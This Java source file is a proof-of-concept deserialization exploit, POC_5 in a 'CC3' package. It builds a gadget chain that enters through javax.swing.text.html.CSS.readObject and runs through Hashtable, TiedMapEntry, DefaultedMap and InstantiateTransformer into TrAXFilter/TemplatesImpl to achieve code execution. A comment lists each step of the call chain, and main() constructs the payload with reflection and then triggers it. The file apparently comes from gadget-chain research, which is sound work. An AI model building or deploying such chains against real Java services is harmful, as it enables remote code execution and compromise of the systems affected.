package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;

import javax.swing.text.html.CSS;
import javax.xml.transform.Templates;
import java.util.Hashtable;

public class POC_5 {

    /*** run with agent css.jar
     * <javax.swing.text.html.CSS: void readObject(java.io.ObjectInputStream)>
     * <java.util.Hashtable: java.lang.Object put(java.lang.Object,java.lang.Object)>
     * <org.apache.commons.collections.keyvalue.TiedMapEntry: int hashCode()>
     * <org.apache.commons.collections.keyvalue.TiedMapEntry: java.lang.Object getValue()>
     * <org.apache.commons.collections.map.DefaultedMap: java.lang.Object get(java.lang.Object)>
     * <org.apache.commons.collections.functors.InstantiateTransformer: java.lang.Object transform(java.lang.Object)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter: void init(javax.xml.transform.Templates)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl: javax.xml.transform.Transformer newTransformer(javax.xml.transform.Templates)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl: com.sun.org.apache.xalan.internal.xsltc.Translet getTransletInstance(javax.xml.transform.Templates)>
     * <java.lang.reflect.Constructor: java.lang.Object newInstance(java.lang.Object[])>
     */

    public static void main(String[] args) throws Exception {
        Templates templates = Share.getTemplatesImplObj();
        InstantiateTransformer transformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        DefaultedMap d = new DefaultedMap("1");
        TiedMapEntry t = new TiedMapEntry(d, TrAXFilter.class);
        CSS css = new CSS(); // use Agent
        Hashtable table = new Hashtable<>();
        table.put(t, "value");

        ReflectionUtil.setField(d, "value", transformer);
        ReflectionUtil.setField(css, "valueConvertor", table);
        SerializeUtil.deserialize(SerializeUtil.serialize(css));
    }

}
